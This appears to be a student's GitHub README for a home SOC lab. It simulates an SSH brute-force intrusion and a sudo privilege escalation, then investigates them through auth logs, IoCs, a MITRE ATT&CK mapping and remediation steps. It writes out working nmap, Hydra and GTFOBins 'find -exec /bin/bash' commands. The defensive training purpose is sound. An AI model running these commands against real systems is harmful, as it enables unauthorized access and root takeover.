# Home SOC Lab - Simulated Intrusion & Privilege Escalation Investigation

A hands-on cybersecurity lab simulating a realistic SSH brute-force intrusion and privilege escalation scenario, analyzed from a SOC analyst perspective using Linux authentication logs and forensic investigation techniques.

---

## Lab Environment

| Component | Details |
|---|---|
| Attacker | Kali Linux (Virtual Machine) |
| Target | Ubuntu (Virtual Machine) |
| Network | Isolated virtual lab environment |
| Logs Analyzed | `/var/log/auth.log`, `/var/log/syslog` |

**Tools Used:** Nmap · Hydra · SSH · grep · last · who

---

## Attack Simulation Workflow

### 1. Reconnaissance

Network reconnaissance was performed to identify exposed services on the target.

```bash
nmap -sS 192.168.x.x
nmap -sV 192.168.x.x
nmap -A 192.168.x.x
nmap -p- 192.168.x.x
```

**Findings:**
- Only port 22 (SSH) was open
- SSH service version identified
- Target OS fingerprinted as Linux
- Minimal attack surface confirmed

---

### 2. SSH Brute-Force Simulation

Automated brute-force login attempts were generated to simulate unauthorized access.

```bash
hydra -l testuser -P passlist.txt ssh://192.168.x.x
```

**Observed behavior:**
- Repeated failed login attempts recorded in system logs
- Pattern consistent with scripted automated login attempts

---

### 3. Log Analysis

Authentication logs were examined to surface suspicious activity and extract attack indicators.

```bash
sudo grep "Failed password" /var/log/auth.log
sudo grep "Invalid user" /var/log/auth.log
sudo grep "Accepted password" /var/log/auth.log
sudo grep sshd /var/log/auth.log
```

**Indicators observed:**
- Multiple failed authentication attempts from the same IP
- Invalid user login attempts
- Successful login event following brute-force activity

![Failed Password Entries](Failed%20Pswd%20Entries.png)

![Grep Results](grep%20results.png)

---

### 4. Session Investigation

Active and historical sessions were reviewed to verify unauthorized access.

```bash
last
who
```

---

### 5. Privilege Escalation Simulation

A controlled sudo misconfiguration was introduced to simulate a privilege escalation vulnerability. The user `testuser` was granted passwordless sudo access to the `find` binary.

```bash
# Sudo misconfiguration
testuser ALL=(ALL) NOPASSWD: /usr/bin/find

# Exploitation via GTFOBins technique
sudo -l
sudo find . -exec /bin/bash \; -quit
whoami
# Result: root
```

**Outcome:** Successful privilege escalation to root confirmed.

![Escalation Result](escalation%20result.png)

---

### 6. Log Evidence of Escalation

Escalation activity was detected in authentication logs.

```bash
sudo grep sudo /var/log/auth.log
# sudo: testuser : COMMAND=/usr/bin/find
```

---

## Indicators of Compromise (IoCs)

| IoC Type | Example | Description |
|---|---|---|
| Suspicious IP | 192.168.x.x | Source of repeated SSH attempts |
| Failed Logins | `Failed password for testuser` | Brute-force attempt pattern |
| Auth Failures | `pam_unix(sshd:auth)` | Repeated login failures |
| Privilege Escalation | `sudo: testuser : COMMAND=/usr/bin/find` | Misconfigured sudo execution |
| Automated Behavior | Multiple attempts per second | Scripted brute-force activity |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Brute Force | T1110 | SSH credential brute-forcing via Hydra |
| Valid Accounts | T1078 | Successful login after brute-force |
| Sudo and Sudo Caching | T1548.003 | Privilege escalation via sudo misconfiguration |
| Unix Shell | T1059.004 | Shell spawned via find -exec |

---

## Remediation Actions

**Containment**
- Block the suspicious source IP
- Lock the compromised user account

**Eradication**
```bash
sudo visudo
# Remove: testuser ALL=(ALL) NOPASSWD: /usr/bin/find
sudo -l  # Verify removal
```

**Recovery**
- Reset user credentials
- Review running processes for persistence
- Audit all sudoers configurations

**Hardening Recommendations**
- Enforce strong password policies
- Implement MFA for SSH access
- Apply least privilege across all accounts
- Monitor auth logs for anomalous patterns
- Restrict SSH access to trusted IPs only

---

## Key Takeaway

Simple configuration mistakes combined with weak monitoring can allow attackers to move from initial access to full system compromise. This lab demonstrates how effective log monitoring, proper privilege management, and strong authentication controls are essential to detect and prevent these attack patterns.

---

## Skills Demonstrated

`SOC Investigation` `Linux Log Analysis` `Brute-Force Detection` `Privilege Escalation Analysis` `IOC Identification` `Incident Response` `MITRE ATT&CK Mapping`

---

> All analysis was performed in a controlled home lab environment. Sensitive information such as real IP addresses has been sanitized.

**Author:** Durga Sai Sri Ramireddy | MS Cybersecurity, University of Houston  
[![LinkedIn](https://img.shields.io/badge/-LinkedIn-0072b1?style=flat&logo=linkedin&logoColor=white)](https://linkedin.com/in/durgaramireddy)
[![GitHub](https://img.shields.io/badge/-GitHub-181717?style=flat&logo=github&logoColor=white)](https://github.com/DurgaRamireddy)

